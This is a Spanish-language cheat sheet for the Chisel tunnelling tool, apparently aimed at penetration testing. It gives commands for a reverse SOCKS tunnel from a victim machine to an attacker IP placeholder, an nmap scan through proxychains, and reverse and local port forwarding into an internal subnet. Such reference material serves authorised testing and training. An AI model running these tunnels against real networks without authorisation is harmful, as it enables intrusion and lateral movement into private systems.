# Chisel Cheat Sheet

Guía de comandos para Chisel, herramienta de túneles TCP y proxy SOCKS para pivoting.

---

## 1. Túnel SOCKS Inverso (Pivoting)

Enrutamiento de tráfico general del atacante a través de la máquina víctima hacia la subred interna.

### Servidor (Atacante)
```bash
./chisel server -p 8000 --reverse
```

### Cliente (Víctima)
* Linux:
  ```bash
  ./chisel client <IP_ATACANTE>:8000 R:socks
  ```
* Windows:
  ```cmd
  chisel.exe client <IP_ATACANTE>:8000 R:socks
  ```
  *(Por defecto expone un proxy SOCKS5 local en el atacante en el puerto `1080`)*

### Configuración de Proxychains (Atacante)
Añadir al final del archivo `/etc/proxychains4.conf`:
```ini
socks5 127.0.0.1 1080
```
Ejemplo de ejecución a través del túnel:
```bash
proxychains nmap -p 22,80,445 -sT -Pn 192.168.2.10
```

> [!WARNING]
> Escaneos sobre proxychains requieren conexión completa TCP (`-sT`). Protocolos basados en SYN o ICMP no son soportados directamente.

---

## 2. Redirección de Puerto Inversa (Reverse Port Forwarding)

Mapeo de un puerto interno e inaccesible de la red hacia un puerto local en el atacante.

* **Servidor (Atacante)**:
  ```bash
  ./chisel server -p 8000 --reverse
  ```
* **Cliente (Víctima)** - Redirigir el puerto 80 del host interno hacia el puerto 8080 del atacante:
  ```bash
  ./chisel client <IP_ATACANTE>:8000 R:8080:192.168.2.10:80
  ```

---

## 3. Redirección de Puerto Local (Local Port Forwarding)

* **Servidor (Víctima)**:
  ```bash
  ./chisel server -p 8000
  ```
* **Cliente (Atacante)**:
  ```bash
  ./chisel client <IP_VICTIMA>:8000 8080:127.0.0.1:80
  ```
